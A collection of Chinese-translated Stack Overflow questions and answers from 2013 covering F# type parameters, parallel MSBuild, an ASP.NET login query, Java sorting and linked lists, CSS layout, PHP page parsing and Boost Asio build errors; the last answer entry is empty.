> 时间：2013-04-05T02:43:31.363
> 
> 标签：f#, type-parameter

据我所知，值定义中的显式类型参数是克服“值限制”问题的一种方法。
当我需要使用它们时，还有其他情况吗？

**Upd**：我的意思是“显式通用构造”，其中类型参数括在尖括号中，即

```
let f<'T> x = x 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T15:48:44.780

多态递归是另一种情况。也就是说，如果你想在函数体中使用不同的泛型实例化，那么你需要在定义上使用显式参数：

```
// perfectly balanced tree
type 'a PerfectTree = 
| Single of 'a
| Node of ('a*'a) PerfectTree

// need type parameters here
let rec fold<'a,'b> (f:'a -> 'b) (g:'b->'b->'b) : 'a PerfectTree -> 'b = function
| Single a -> f a
| Node t -> t |> fold (fun (a,b) -> g (f a) (f b)) g

let sum = fold id (+)

let ten = sum (Node(Node(Single((1,2),(3,4))))) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T13:59:51.630

这可能很少见，但是当您想防止进一步泛化时（第 14.6.7 节）：

> 值和成员定义上的显式类型参数定义会影响类型推断和泛化的过程。特别是，包含显式泛型参数的声明不会被泛化到那些泛型参数之外。例如，考虑这个函数：

```
let f<'T> (x : 'T) y = x 
```

> 在类型推断期间，这将导致以下类型的函数，其中 '_b 是尚未解析的类型推断变量。

```
f<'T> : 'T -> '_b -> '_b 
```

> 为了允许对这些定义进行泛化，要么删除显式泛型参数（如果可以推断出它们），要么使用所需数量的参数，如以下示例所示：

```
let throw<'T,'U> (x:'T) (y:'U) = x 
```

当然，您也可以使用类型注释来完成此操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T02:58:21.353

最明显的例子：编写一个函数来计算字符串的长度。

你必须写：

```
let f (a:string) = a.Length 
```

你需要注释。没有注释，编译器无法确定`a`. 存在其他类似的示例 - 特别是在使用设计为从 C# 使用的库时。

**处理更新的答案：**

同样的问题适用 -`string`变成`A<string>`了具有`get`返回 a的方法`string`

```
let f (a:A<string>) = a.get().Length 
```

# msbuild - 并行 MSBUILD - 关键部分？

> ID：15825035
> 
> 赞同：3
> 
> 时间：2013-04-05T02:43:39.907
> 
> 标签：msbuild

我的组织有一些在构建服务器上运行的大型构建，构建了大量与 ProjectReferences 链接的 MSBUILD 项目。我们需要能够与`msbuild /m`.

我的问题是我有一个项目被大量其他项目引用，但项目本身**不可**重入。如果超过两个或更多节点尝试并行构建该项目，它将失败。

如何将这个项目或它的目标包装在关键部分中？

我真正需要做的是这样的事情：

```
<Target>
    <EnterCriticalSection ID=$(ProjectGuid) />
    <Exec something />
    <LeaveCriticalSection ID=$(ProjectGuid) />
</Target> 
```

这个想法是，如果多个 MSBUILD 节点尝试并行构建此项目，则只有一个节点可以执行，其余节点将不得不等待（或去做其他事情）。

我想我可以编写自定义的 MSBUILD 任务来执行此操作，但是在 MSBUILD 系统中没有内置的方法吗？

**===** *2013 年 4 月 5 日编辑*。澄清一下，该项目正在使用为其提供的构建脚本构建一个 3rd-party 库。完全重写他们的构建脚本以使其可重入——通过确保每个构建使用不同的一组文件夹来存储中间文件等——在理论上是可能的，但不是一个实际的解决方案。一方面，所有这些工作都必须在该库的每个新版本上重新完成。

**===** *2013 年 4 月 6 日编辑*。进一步思考，我认为甚至理论上不可能确保项目是可重入的。让我解释：

假设项目 XYZ 设置为根据平台和配置以通常的方式使用不同的临时目录：
**XYZ.proj**：

```
<PropertyGroup>
  <MyWorkingDir>tmp.$(Platform).$(Configuration)</MyWorkingDir>
</PropertyGroup> 
```

现在假设其他一些项目 GraphicsWindow 通过 ProjectReferences 或 MSBuild 任务引用项目 XYZ。并假设可以构建 GraphicsWindow 项目以使用各种图形 API。即，有一个 OpenGL 版本、一个 DirectX 9 版本、一个 DirectX 10 版本......

因此，某处有一个 .proj 或 .targets 文件，其中包含构建所有四个版本的目标：

```
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <ItemGroup>
        <ProjectToBuild Include="GraphicsWindow.proj">
            <Properties>GraphicsApi=OpenGL</Properties>
        </ProjectToBuild>
        <ProjectToBuild Include="GraphicsWindow.proj">
            <Properties>GraphicsApi=D3D9</Properties>
        </ProjectToBuild>
        <ProjectToBuild Include="GraphicsWindow.proj">
            <Properties>GraphicsApi=D3D10</Properties>
        </ProjectToBuild>
        <ProjectToBuild Include="GraphicsWindow.proj">
            <Properties>GraphicsApi=D3D11</Properties>
        </ProjectToBuild>
    </ItemGroup>
    <Target Name="All">
        <MSBuild Projects="@(ProjectToBuild)" BuildInParallel="true" />
    </Target>
</Project> 
```

或使用批处理的等效项。

***现在 MSBuild 将使用相同***的Platform|Configuration 组合和相同的工作目录构建 XYZ 项目 4 次。

只要您在没有 /m 选项的情况下构建并且 MSBuild 运行单个线程，这将正常工作。根据 XYZ 项目的编写方式，第 2、第 3 和第 4 次构建可能什么都不做，因为输出是最新的，或者它可能会做一些多余的工作，但最终结果将是正确的并且构建会成功.

但是，一旦您开始使用并行 MSBuild，**这个构建就被破坏了！** 现在有一个竞争条件，多个线程可以同时进入 XYZ 项目的目标，并使用相同的工作目录开始构建，这将失败。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T14:49:22.873

无论您如何执行 MSBuild，无论是否使用 multi-proc 选项 /m，都可以保证为构建请求的每个配置执行一次项目。这是来自[MSDN](http://msdn.microsoft.com/en-us/library/vstudio/bb383805.aspx)的引用：

> 当 Microsoft 构建引擎在使用并行构建来构建项目时遇到项目到项目 (P2P) 引用时，它只会构建一次引用。如果两个项目具有相同的 P2P 引用，则不会为每个项目重新构建该引用。相反，构建引擎为依赖它的两个项目返回相同的 P2P 引用。会话中对同一目标的未来请求将提供相同的 P2P 参考。

如果您看到多次构建同一个项目，这意味着它在两个（或多个）不同的配置中被引用。这里的配置是指传递给项目的一组参数，例如项目平台（x86、x64、AnyCPU 等）风格（调试/零售）、本地化语言、您可能使用的任何其他参数。

通常，这是项目平台混合的问题。例如，您有为 x64 构建的项目 A，为 AnyCPU 构建的项目 B，并且 A 和 B 都引用 C。现在必须为 x64 和 AnyCPU 构建两次 C。如果 C 通过将输出清晰地分开到单独的目录中正确处理这两个平台，则没有问题。但是，如果 C 将 x64 和 AnyCPU 视为相同，它将在多进程构建中随机失败。

首先检查您的解决方案配置对话框。确保所有项目都具有一致的平台/配置参数集。如果您需要在不同的配置中构建相同的项目，请确保将输出放在不同的位置。

# asp.net - 检查是否存在来自 aspx.vb Web 表单的 sql 记录

> ID：15825038
> 
> 赞同：0
> 
> 时间：2013-04-05T02:43:52.983
> 
> 标签：asp.net, sql, vb.net

我已经在 Visual Studio 2010 中做一个项目大约一周了。我正在使用 vb 和一个简单的 sql 数据库。我正在尝试创建一个登录页面，以检查客户表中是否存在具有指定电子邮件和密码的记录。我已经到了超出调试深度的地步，任何人都可以看到导致错误的原因吗？

Login Web 表单的 Login.aspx.vb 文件如下所示：

```
Imports LoginTableAdapters

Partial Class Login
    Inherits System.Web.UI.Page

Dim LoginAdapter As LoginTableAdapter

Protected Sub Button1_Click(sender As Object, e As System.EventArgs) Handles Button1.Click
    Dim email As String
    Dim pass As String
    LoginAdapter = New LoginTableAdapter

    email = TextBox1.Text
    pass = TextBox2.Text

    If Me.LoginAdapter.QueryLogin(email, pass) Then
        Label1.Visible = True
    End If

    End Sub
End Class 
```

QueryLogin() 的 SQL 如下所示：

```
SELECT        custemail, custpassword
FROM            customer
WHERE        (custemail = @Param1) AND (custpassword = @Param2) 
```

这是只有在输入正确的用户/密码组合时才会发生的错误：

```
Server Error in '/DinnerNow' Application.
Input string was not in a correct format.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.FormatException: Input string was not in a correct format.

Source Error:

The source code that generated this unhandled exception can only be shown when compiled in debug mode. To enable this, please follow one of the below steps, then request the URL:

1\. Add a "Debug=true" directive at the top of the file that generated the error. Example:

  <%@ Page Language="C#" Debug="true" %>

or:

2) Add the following section to the configuration file of your application:

<configuration>
   <system.web>
       <compilation debug="true"/>
   </system.web>
</configuration>

Note that this second technique will cause all files within a given application to be compiled in debug mode. The first technique will cause only that particular file to be compiled in debug mode.

Important: Running applications in debug mode does incur a memory/performance overhead. You should make sure that an application has debugging disabled before deploying into production scenario.

Stack Trace:

[FormatException: Input string was not in a correct format.]
   Microsoft.VisualBasic.CompilerServices.Conversions.ParseDouble(String Value, NumberFormatInfo NumberFormat) +181
   Microsoft.VisualBasic.CompilerServices.Conversions.ToBoolean(String Value) +147

[InvalidCastException: Conversion from string "test@test.test" to type 'Boolean' is not valid.]
   Microsoft.VisualBasic.CompilerServices.Conversions.ToBoolean(String Value) +337
   Microsoft.VisualBasic.CompilerServices.Conversions.ToBoolean(Object Value) +1304756
   Login.Button1_Click(Object sender, EventArgs e) +104
   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9553178
   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +103
   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +10
   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +13
   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1724 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:45:52.063

你正在做的是

```
If Me.LoginAdapter.QueryLogin(email, pass) 
```

这意味着返回到 this 的值应该是布尔类型。但是您的 sql 查询返回 custemail、custpassword。哪些是字符串类型。因此，布尔值不能与字符串类型进行比较。

将您的 sql 更改为

```
if((SELECT   Count(*) FROM customer WHERE (custemail = @Param1) AND (custpassword = @Param2))>0)
   Select Cast(1 as bit) IsCustomerExist
Else
    Select Cast(0 as bit) IsCustomerExist 
```

# git - 雅虎集团和 Bitbucket/GitHub？

> ID：15825039
> 
> 赞同：1
> 
> 时间：2013-04-05T02:44:33.007
> 
> 标签：git, yahoo, mailing-list

我想在 Bitbucket 或 GitHub 上自动发送 GIT 推送操作的电子邮件通知。我用了谷歌组，效果很好。但由于谷歌在中国被屏蔽，管理邮件列表很不方便。所以我想切换到看起来像谷歌组的雅虎组。

我的问题是如何在 Yahoo 群组中添加 Bitbucket 电子邮件“commits-noreply@bitbucket.org”？

谢谢！

# java - DVD 排序程序中的线程“main”java.lang.NullPointerException 中的异常

> ID：15825048
> 
> 赞同：0
> 
> 时间：2013-04-05T02:45:10.243
> 
> 标签：java, eclipse, comparable

我正在尝试创建一个程序，将 DVD 信息放入数组中，并使用 Comparable 中的 compareTo 方法根据标题按字母顺序对它们进行排序。

我有一个布尔方法可以确定两个标题是否相同：

```
public boolean equals (Object other)
{
    return (title.equals(((DVD)other).getTitle()));
} 
```

我的 compareTo 方法如下所示：

```
public int compareTo (Object other)
{
    int result;

    String otherTitle = ((DVD)other).getTitle();

    result = title.compareTo(otherTitle);

    return result;
} 
```

这两种方法在我实现 Comparable 的 DVD 类中。

我直接从一个按字母顺序对名称进行排序的示例中使用了排序算法本身，但这里也是如此：

```
public class DVDSorting 
{
    public static void selectionSort (Comparable[] list)
    {
        int min;
        Comparable temp;

        for (int index = 0; index < list.length-1; index++)
        {
            min = index;
            for (int scan = index+1; scan < list.length; scan++)
                if (list[scan].compareTo(list[min]) < 0)
                    min = scan;

            temp = list[min];
            list[min] = list[index];
            list[index] = temp;
        }
    }

    public static void insertionSort(Comparable[] list)
    {
        for (int index = 1; index < list.length; index++)
        {
            Comparable key = list[index];
            int position = index;
            while (position > 0 && key.compareTo(list[position-1]) < 0)
            {
                list[position] = list[position-1];
                position--;
            }

            list[position] = key;
        }
    }
} 
```

然后我创建了一个 DVDCollection 类来初始化数组并包含一个添加 DVD 的方法。

在我要测试的驱动程序类中，我能够插入 DVD 并打印出插入的内容，但是当我尝试对它们进行排序时，我得到一个空指针异常，即使我没有看到任何初始化为空的东西。这是我的司机：

```
public class Movies
{
    public static void main (String[] args)
    {
        DVDCollection movies = new DVDCollection();

        movies.addDVD("The Godfather", "Francis Ford Coppola", 1972, 24.95, true);
        movies.addDVD("District 9", "Neill Blomkamp", 2009, 19.95, false);
        movies.addDVD("Iron Man", "Jon Favreau", 2008, 15.95, false);
        movies.addDVD("All About Eve", "Joseph Mankiewicz", 1950, 17.50, false);
        movies.addDVD("The Matrix", "Andy & Lana Wachowski", 1999, 19.95, true);
        movies.addDVD("Clash of the Titans", "Louis Leterrier", 2010, 19.95, true);

        DVDSorting.selectionSort(movies.collection);
        System.out.println (movies);

        movies.addDVD("Iron Man 2", "Jon Favreau", 2010, 22.99, false);
        movies.addDVD("Casablanca", "Michael Curtiz", 1942, 19.95, false);
        movies.addDVD("Clash of the Titans", "Desmond Davis", 1981, 5.00, false);

        DVDSorting.selectionSort(movies.collection);
        System.out.println (movies);
    }
} 
```

我在排序调用中使用了 movies.collection ，因为当我尝试只使用我看过的示例之类的电影时，它说 selectionSort 不适用于电影所以我将 collection 设为公共变量并使用它。

这是错误。

```
Exception in thread "main" java.lang.NullPointerException
    at DVDSorting.selectionSort(DVDSorting.java:13)
    at Movies.main(Movies.java:15) 
```

它告诉我错误在 DVDSorting 类中，但由于它是从另一个来源复制的，我感觉实际错误在我的 DVD 类中的 compareTo 方法中。

如果我的问题不符合网站的适当礼仪，我很抱歉，这是我第一次发帖。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:37:15.997

我的猜测是，或者`list`在方法`list[scan]`中的某个点为空`selectionSort()`。也许尝试验证`movies.collection`（从您的主要方法）实际上存储了您认为的值。

对于 Eclipse 调试器来说，这是一项很好的任务。

# java - Java - 创建图像

> ID：15825059
> 
> 赞同：5
> 
> 时间：2013-04-05T02:46:40.330
> 
> 标签：java, image, graphics2d

我目前正在使用 Java 开发游戏，并尝试在不使用任何图像文件的情况下创建背景。图像由一个正方形组成，分成 4 个三角形，每个三角形都有不同的颜色。

如果有人可以向我指出一些正在使用`Graphics2D`然后将其保存到 a `BufferedImage`，那就太好了。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-05T02:50:01.980

我建议：

*   首先使用接受三个整数的构造函数创建一个 BufferedImage：宽度、高度和 BufferedImage 类型，BufferedImage.TYPE_INT_ARGB 可能会很好，宽度和高度可能是程序中的常量。
*   `createGraphics()`您可以通过调用其方法从 BufferedImage 中提取 Graphics2D 对象。
*   然后使用 Graphics 对象的方法进行绘制`drawXXX(...)`，您可以从中选择很多方法。
*   要更改颜色，只需调用`setColor(Color c)`您的 Graphics/Graphics2D 对象。
*   绘制完成后，请务必通过其`dispose()`方法处理您的 Graphics 对象。
*   **按照 Adrian Blackburn 进行编辑**，查看作为标准 Oracle Java 教程的一部分的[BufferedImage教程。](http://docs.oracle.com/javase/tutorial/2d/images/drawonimage.html)

# jquery - 不能影响值得一提的css

> ID：15825061
> 
> 赞同：1
> 
> 时间：2013-04-05T02:47:01.127
> 
> 标签：jquery, css, zurb-foundation, jquery-selectbox

我是 Foundation 和 jQuery SelectBox 的新手。也就是说，我已经浪费了一整夜试图完成一项简单的任务，但几乎没有任何结果。

我有这个 HTML：

```
<!--  Top Nav -->
<div class="nav row">
    <div class="small-3 columns">
        <select id="team" name="team">
            <option value="volvo">Volvo</option>
            <option value="saab">Saab</option>
            <option value="mercedes">Mercedes</option>
            <option value="audi">Audi</option>
        </select>
    </div>
    <div class="gear small-1 columns">
        <a href="#"><img id="teamSettingsGear" src="/images/settings.png" alt="Team Settings" /></a>
    </div>
    <div class="small-3 columns">
        <select id="site" name="site">
            <option value="red">Red</option>
            <option value="blue">Blue</option>
            <option value="green">Green</option>
            <option value="yellow">Yellow</option>
        </select>   
    </div>
    <div class="gear small-1 columns">  
        <a href="#"><img id="siteSettingsGear" src="/images/settings.png" alt="Site Settings" /></a>
    </div>
    <div class="small-3 columns">
        <select id="info" name="info">
            <option value="volvo">Volvo</option>
            <option value="saab">Saab</option>
            <option value="mercedes">Mercedes</option>
            <option value="audi">Audi</option>
        </select>   
    </div>
    <div class="gear small-1 columns">
        <a href="#"><img id="informationGear" src="/images/settings.png" alt="Information" /></a>   
    </div>
</div> 
```

它同时使用 Foundation 4 和 Ivanov 的名为 SelectBox 的 jQuery 插件。

这是我的服务员CSS：

```
.header, .help, .content, .footer {
padding-top: 10px;
} 

.content {
height: 500px;
}

.inventory, .multipurpose, .cart {
text-align: center;
}

.nav {
position: relative;
top: -15px;
}

.gear {
padding-left: 0px !important;
margin-left: 0px !important;
} 
```

我想做的就是让齿轮浮动到选择框的右侧，中间可能有 10px。

如果我将选择框和齿轮图像放在同一个 div 中，则齿轮图像会放在下一个“行”下。

如果我弄乱了位置：相对；左：-无论如何，齿轮确实靠近选择框，但因为它是一个响应式 css 工具包，我所要做的就是扩大浏览器以再次将它们隔开。相反，如果我缩小浏览器窗口，齿轮会浮在选择框上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:15:27.527

您无需添加其他样式即可使用 Foundation 将图像与下拉列表对齐。请记住，如果您在每一列中将两个元素放在一行中，它将浮动到彼此的右侧。尝试删除所有用于定位的样式，然后将那些样式保留在您希望有额外填充或边距的地方。[这个小提琴](http://jsfiddle.net/B9Rck/)向您展示了如何完成它。

对于移动视图，请记住很多移动设备都很小，您可以让用户使用 240x400 的设备。为了迎合那些小型设备，您必须拆分列，这样它们**才能真正响应**，而不是将它们全部放在一行中。下面的示例也在小提琴中显示了如何完成它。现在，您当然可以更改`8`和`4`组合以满足您的需要。但基本上这就是如何在小型设备上正确呈现元素的想法。

```
<div class="nav row">
    <div class="small-8 large-3 columns">
        <select id="team" name="team">
            <option value="volvo">Volvo</option>
            <option value="saab">Saab</option>
            <option value="mercedes">Mercedes</option>
            <option value="audi">Audi</option>
        </select>
    </div>
    <div class="gear small-4 large-1 columns">
        <a href="#"><img id="teamSettingsGear" src="img/gear.png" alt="Team Settings" /></a>
    </div>
    <div class="small-8 large-3  columns">
        <select id="site" name="site">
            <option value="red">Red</option>
            <option value="blue">Blue</option>
            <option value="green">Green</option>
            <option value="yellow">Yellow</option>
        </select>   
    </div>
    <div class="gear small-4 large-1 columns">  
        <a href="#"><img id="siteSettingsGear" src="img/gear.png" alt="Site Settings" /></a>
    </div>
    <div class="small-8 large-3 columns">
        <select id="info" name="info">
            <option value="volvo">Volvo</option>
            <option value="saab">Saab</option>
            <option value="mercedes">Mercedes</option>
            <option value="audi">Audi</option>
        </select>   
    </div>
    <div class="gear small-4 large-1 columns">
        <a href="#"><img id="informationGear" src="img/gear.png" alt="Information" /></a>   
    </div>
</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T02:56:41.857

```
.columns { float:left; }

.clear { clear:both; height:0; } 
```

这是一个适合你的小提琴：

[http://jsfiddle.net/iGanja/L8vdh/](http://jsfiddle.net/iGanja/L8vdh/)

# php - 使用 PHP 在 div 中打开链接

> ID：15825063
> 
> 赞同：1
> 
> 时间：2013-04-05T02:47:31.393
> 
> 标签：php, jquery, html, php-parser

我正在建立一个解析西班牙语词典的网站。如果您查找单词 HOLA，您将收到定义，但换句话说，您会收到建议，例如 CASA： http: [//verbum.xtrweb.com/verbumpost.php ?word0=hola&word-1=casa](http://verbum.xtrweb.com/verbumpost.php?word0=hola&word-1=casa)

我希望：当您单击建议时（例如我上面发布的示例中的 CASAR）以将结果打印在像 HOLA 这样的 div 中。这是我目前正在使用的代码：

```
$words = array('word0','word-1');
        function url_decode($string){
        return urldecode(utf8_decode($string));
        }

        $baseUrl = 'http://lema.rae.es/drae/srv/search?val=';

        $cssReplace = <<<EOT

        <style type="text/css">
        // I changed the style
        </style>
        </head>
EOT;

$resultIndex = 0;

foreach($words as $word) {
    if(!isset($_REQUEST[$word]))
        continue;

    $contents = file_get_contents($baseUrl . urldecode(utf8_decode($_REQUEST[$word])));

    $contents = str_replace('</head>', $cssReplace, $contents);
    $contents = preg_replace('/(search?[\d\w]+)/','http://lema.rae.es/drae/srv/search', $contents);

    echo "<div style='
          //style
         ", (++$resultIndex) ,"'>", $contents,
            "</div>";
    } 
```

**我开始编码了，所以请耐心等待，我也尝试了一些朋友建议的 DOM 代码，但它无法正常工作。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T02:55:05.097

要[在样式 div 中输出内容](http://i.imgur.com/HDPDqwB.jpg)，只需替换：

```
echo "<div style='
      //style
     ", (++$resultIndex) ,"'>", $contents,
        "</div>";
} 
```

和：

```
$divStyle = 'background: none repeat scroll 20% center transparent; margin-left: 275px; height: auto; box-shadow: 0px 0px 10px rgb(0, 0, 0) inset; border: 1px solid rgb(0, 0, 0); margin-top: 35px; padding-left: 14px; width: 793px; padding-bottom: 80px;';

//insert $divStyle as the "style" attribute
echo "<div style='" . $divStyle . "'" . (++$resultIndex) . "'>" . $contents . "</div>"; 
```

有 2 件事发生了变化：

*   点，而不是逗号来加入 PHP 字符串中的内容。
*   移除了溢出（不需要滚动条）并在 div 底部添加了填充（额外的内部空间）

# java - 在节点之间添加元素 Ordered LinkedList

> ID：15825065
> 
> 赞同：0
> 
> 时间：2013-04-05T02:48:00.367
> 
> 标签：java, linked-list, boolean, add

我在这个网站上查询了搜索引擎，但我没有看到任何与我正在寻找的东西相匹配的东西，所以我希望这个问题还没有在其他地方得到回答。我正在尝试完善我对有序 LinkedList 的添加方法。程序的其余部分运行良好，虽然列表按照测试工具中的指定打印出来，但我希望对名称进行排序。

在多次调用从线束中添加和删除之后，我的输出是这样的：

```
Sue, Bill, Michael, Someguy, Michael, Carl, Steve, Carl, Sue
Sue, Bill, Someguy, Michael, Steve, Carl, Sue
Sue, Bill, Someguy, Michael, Steve, Carl, Sue, Sue, Bill 
```

我想要的是：Sue、Sue、Bill、Michael、Michael、Carl、Carl、Steve 等……

我的添加方法：

```
 public boolean add(Comparable obj)
{
    OrderedListNode newNode = new OrderedListNode(obj, null, null);
    if( tail == null) {
    tail = newNode;
    head = tail;
    modCount++;
    return true;

    }
    if(((Comparable)(head.theItem)).equals(obj)){
        tail.previous = newNode;
        modCount++;
        return true;
    }else{

    tail.previous.next = newNode;
    newNode.previous = tail.previous;
    newNode.next = tail;
    tail.previous = newNode;
    modCount++;
    return true;
    }
} 
```

整个代码，因为它被要求：

```
package dataStructures;

public class OrderedLinkedList
{

/**************************************************************************
 * Constants
 *************************************************************************/

/** return value for unsuccessful searches */
private static final OrderedListNode NOT_FOUND = null;

/**************************************************************************
 * Attributes
 *************************************************************************/

/** current number of items in list */
private int theSize;

/** reference to list header node */
private OrderedListNode head;

/** reference to list tail node */
private OrderedListNode tail;

/** current number of modifications to list */
private int modCount;

/**************************************************************************
 * Constructors
 *************************************************************************/

/**
 *  Create an instance of OrderedLinkedList.
 *
 */
public OrderedLinkedList()
{
    // empty this OrderedLinkedList
    clear();
}

/**************************************************************************
 * Methods
 *************************************************************************/

/*
 *  Add the specified item to this OrderedLinkedList.
 *
 *  @param  obj     the item to be added
 */
public boolean add(Comparable obj)
{
    OrderedListNode newNode = new OrderedListNode(obj, null, null);
    if( tail == null) {
    tail = newNode;
    head = tail;
    modCount++;
    return true;

    }
    if(((Comparable)(head.theItem)).compareTo(obj) > 0){
        ////////////////////////////////////////
        //here is where my problem lies, I believe
        /////////////////////////////////////////
        modCount++;
        return true;
    }else{

    tail.previous.next = newNode;
    newNode.previous = tail.previous;
    newNode.next = tail;
    tail.previous = newNode;
    modCount++;
    return true;
    }
}

/*
 *  Remove the first occurrence of the specified item from this OrderedLinkedList.
 *
 *  @param  obj     the item to be removed
 */
public boolean remove(Comparable obj)
{
    if(head == null) return false;
    if(((Comparable)(head.theItem)).compareTo(obj) == 0) {
    if(head == tail) {
        head = tail = null;
        return true;
    }
    head = head.next;
    return true;
    }

    if(head == tail)return false;
    OrderedListNode ref = head;
    while( ref.next != tail) {
        if(((Comparable)(ref.next.theItem)).compareTo(obj) == 0) {
            ref.next = ref.next.next;
            return true;
        }
        ref = ref.next;
    }
    if(((Comparable)(tail.theItem)).compareTo(obj) == 0 ) {
        tail = ref;
        tail.next = null;
        return true;
    }

    return false;

}

/**
 *  Empty this OrderedLinkedList.
 */
public void clear()
{
    // reset header node
    head = new OrderedListNode("HEAD", null, null);

    // reset tail node
    tail = new OrderedListNode("TAIL", head, null);

    // header references tail in an empty LinkedList
    head.next = tail;

    // reset size to 0
    theSize = 0;

    // emptying list counts as a modification
    modCount++;
}

/**
 *  Return true if this OrderedLinkedList contains 0 items.
 */
public boolean isEmpty()
{
    return theSize == 0;
}

/**
 *  Return the number of items in this OrderedLinkedList.
 */
public int size()
{
    return theSize;
}

/*  
 *  Return a String representation of this OrderedLinkedList.
 *
 *  (non-Javadoc)
 *  @see java.lang.Object#toString()
 */
@Override
public String toString()
{
    String s = "";

    OrderedListNode currentNode = head.next;

    while (currentNode != tail)
    {
        s += currentNode.theItem.toString();

        if (currentNode.next != tail)
        {
            s += ", ";
        }

        currentNode = currentNode.next;
    }

    return s;
}

private static class OrderedListNode<Comparable> {

    Comparable theItem;
    OrderedListNode<Comparable> next;
    OrderedListNode<Comparable> previous;

    public OrderedListNode(Comparable theItem, OrderedListNode<Comparable> previous, OrderedListNode<Comparable> next) {
        this.theItem = theItem;
        this.next = next;
        this.previous = previous;
    }

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:28:02.323

这条线肯定是错的

```
if(((Comparable)(head.theItem)).equals(obj)) { 
```

你应该使用 Comparable.compareTo，除了你应该总是从头开始，直到你找到一个大于或等于 obj 的元素并在它之前插入 obj，像这样

```
public boolean add(Comparable obj) {
    modCount++;
    if (head == null) {
        head = new OrderedListNode(obj, null, null);
        return true;
    }
    for (OrderedListNode current = head; current != null; current = current.next) {
        if (((Comparable) (current.theItem)).compareTo(obj) >= 0) {
            current.prev = new OrderedListNode(obj, current.prev, current);
            return true;
        }
    }
    tail.next = new OrderedListNode(obj, tail, null);
    return true;
} 
```

# c++ - Boost Asio GCC 链接错误

> ID：15825068
> 
> 赞同：1
> 
> 时间：2013-04-05T02:48:10.833
> 
> 标签：c++, linux, gcc, boost, boost-asio

我刚刚用 xubuntu 12.10 安装了一个干净的虚拟机，我正在尝试移植一些在 Windows 上完美运行的 C++ 代码。首先，我已经安装了 Virtualbox 来宾添加和 GCC，我可以编译代码。

我已经从 Internet (boost_1_52) 下载了 boost 库，我已经从 asio 网站 (boost_asio_1_4_8) 放入了 asio 库，并且我已经使用这些说明安装了多线程共享链接版本：

```
./bootstrap.sh --prefix=/usr &&
./b2 stage threading=multi link=shared

as root: 
```

我知道 boost 可以工作，因为我已经能够在这里编译测试应用程序（与 lboost_regex 链接）并且它工作得很好：

```
#include <boost/regex.hpp>
#include <iostream>
#include <string>

int main()
{
    std::string line;
    boost::regex pat( "^Subject: (Re: |Aw: )*(.*)" );

    while (std::cin)
    {
       std::getline(std::cin, line);
        boost::smatch matches;
           if (boost::regex_match(line, matches, pat))
           std::cout << matches[2] << std::endl;
    }
} 
```

所以我正在尝试构建一个 ASIO 示例，这是我之前构建的，在 Windows 上没有问题。文件在这里：

[http://www.boost.org/doc/libs/1_53_0/doc/html/boost_asio/examples.html](http://www.boost.org/doc/libs/1_53_0/doc/html/boost_asio/examples.html)

看：

```
boost_asio/example/serialization/client.cpp
boost_asio/example/serialization/connection.hpp
boost_asio/example/serialization/server.cpp
boost_asio/example/serialization/stock.hpp 
```

我把我的编译器扔了：

gcc client.cpp -I /usr/include/boost -lboost_system -lboost_thread -lboost_serialization

这给了我这个错误：

```
connection.hpp:75:35: error: template argument 1 is invalid
connection.hpp:75:35: error: template argument 2 is invalid
connection.hpp:75:44: error: invalid type in declaration before ‘;’ token
connection.hpp:76:13: error: request for member ‘push_back’ in ‘buffers’, which is of non-class type ‘int’
connection.hpp:76:23: error: ‘asio’ is not a class or namespace
connection.hpp:77:13: error: request for member ‘push_back’ in ‘buffers’, which is of non-class type ‘int’
connection.hpp:77:23: error: ‘asio’ is not a class or namespace
connection.hpp:78:5: error: ‘asio’ is not a class or namespace
connection.hpp:78:23: error: ‘socket_’ was not declared in this scope
connection.hpp: In member function ‘void s11n_example::connection::async_read(T&, Handler)’:
connection.hpp:87:15: error: ‘asio’ does not name a type
connection.hpp:87:31: error: expected unqualified-id before ‘&amp;’ token
connection.hpp:87:31: error: expected ‘)’ before ‘&amp;’ token
connection.hpp:87:31: error: expected initializer before ‘&amp;’ token
connection.hpp:90:5: error: ‘asio’ has not been declared
connection.hpp:90:22: error: ‘socket_’ was not declared in this scope
connection.hpp:90:31: error: ‘asio’ has not been declared
connection.hpp:91:21: error: ‘f’ was not declared in this scope
connection.hpp:92:17: error: ‘asio’ has not been declared
client.cpp: At global scope:
client.cpp:26:10: error: ‘asio’ has not been declared
client.cpp:26:26: error: expected ‘)’ before ‘&amp;’ token
client.cpp:43:29: error: ‘asio’ does not name a type
client.cpp:43:45: error: expected unqualified-id before ‘&amp;’ token
client.cpp:43:45: error: expected ‘)’ before ‘&amp;’ token
client.cpp:43:35: error: expected ‘;’ at end of member declaration
client.cpp:43:47: error: ISO C++ forbids declaration of ‘e’ with no type [-fpermissive]
client.cpp:43:47: error: expected ‘;’ at end of member declaration
client.cpp:43:48: error: expected unqualified-id before ‘)’ token
client.cpp:125:1: error: expected ‘}’ at end of input
client.cpp:125:1: error: expected unqualified-id at end of input
client.cpp:125:1: error: expected ‘}’ at end of input 
```

我真的很困惑，好像我没有建立提升或者我错过了另一个链接。我也尝试过与 Winsock 链接，但没有结果。请帮忙！

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-10-07T14:58:22.440

